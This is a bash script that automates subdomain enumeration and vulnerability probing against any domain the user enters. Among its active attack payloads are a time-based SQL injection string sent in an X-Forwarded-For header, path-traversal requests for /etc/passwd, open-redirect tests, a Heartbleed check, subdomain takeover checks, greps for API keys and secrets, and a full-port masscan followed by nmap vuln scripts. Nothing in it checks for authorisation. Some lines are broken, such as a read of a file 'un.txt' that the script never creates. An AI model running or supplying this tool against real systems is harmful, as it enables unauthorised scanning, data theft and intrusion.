#!/bin/bash
# Colored "Cyberpunk" letter
echo -e "${r}             Hack the System!             ${e}"
echo -e "${r}             Code By Cyber Punk!            ${e}"
# selecting domain and targets
read -p "Whats Your Domain :" target
read -p "Name of Output Dirctory :" output
mkdir $output
echo "-------------------------------------------------------------------------" 
echo "-------------------------------------------------------------------------" 
#gathering subdomains
echo "using assetfinder :"
echo $target | assetfinder -subs-only | anew $output/assetfinder.txt
echo "-------------------------------------------------------------------------" 
echo "-------------------------------------------------------------------------" 
echo "using findomain :"
findomain -t $target -u $output/findomain.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Using Subfinder :"
subfinder -d $target -all -o $output/subfinder.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Using Subenum.sh :"
curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "domain=$target&submit=" https://seckrd.com/subdomain-finder.php | grep -oE "https?://[^'\"]+" | awk -F/ '{print $3}' > $output/subenum.txt ;
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Using crt.sh :"
curl -s "https://crt.sh/?q=%25.$target&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > "$output/crt.txt"
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "---------------------------------------------------------------------"
echo "---------------------------------------------------------------------"
echo "Managing subdomains files into uniq file:"
cd $output
cat * | uniq | anew uniq.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Finding Valid subdomains :"
httpx -l uniq.txt -mc  200,403,301 -o validsubdomains.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Finding Heartbleed Vulnerability:"
cat validsubdomains.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done > heartbleed.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Finding subdomain takeover:"
subzy run --targets uniq.txt --timeout 30 --output subtake
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Checking for Header-Based-SQL-Injection:"
cat un.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"

echo "-----------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Gathering urls using gau tool"
xargs -a uniq.txt -I@ sh -c 'gau -b css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a gau.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "using waybackurls"
cat validsubdomains.txt | waybackurls | anew waybackurls.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "using katana"
katana -list validsubdomains.txt -js-crawl -d 5   -o katana.txt 
cat katana.txt | grep ".js$" | anew js.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "managing urls"
cat * | uniq | anew uniqurl.txt
rm -rf waybackurls.txt gau.txt katana.txt
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
mkdir cetagorized-urls
cp uniqurl.txt cetagorized-urls
cd cetagorized-urls
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "cetagorizing urls:"
cat uniqurl.txt | gf api-keys | anew api-keys.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf lfi | anew lfi.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf idor | anew idor.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf rce | anew rce.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf redirect | anew redirect.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf secrets | anew secrets.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf sqli | anew sqli.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf ssrf | anew ssrf.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf ssti | anew ssti.txt
echo "-------------------------------------------------------------------------"
cat uniqurl.txt | gf xss | anew xss.txt
echo "-------------------------------------------------------------------------"

echo "Finding LFI"
gau lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
echo"--------------------------------------------------------------------------"
echo "Finding open redirect"
cat redirect.txt | qsreplace "https://google.com" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: https://google.com" && echo "VULN! %"'

echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Starting IP enumeration"
echo "making directory for IP:"
cd ..
mkdir IP
cp uniq.txt  IP
cd IP
httpx -l uniq.txt -ip  -o sb.txt
echo "seprating IPS:"
grep -Eo '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' sb.txt > validip.txt

echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"
echo "Enumerating Nmap Scan:"
masscan -p1-65535 -iL validip.txt  -oL masscan.txt
awk '{ print $4 }' masscan.txt | sort | uniq > nmap.txt
nmap --script "discovery,vulners,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-*" -Pn -iL nmap.txt -oX nout.xml
xsltproc nout.xml -o nout.html
echo "-------------------------------------------------------------------------"
echo "-------------------------------------------------------------------------"

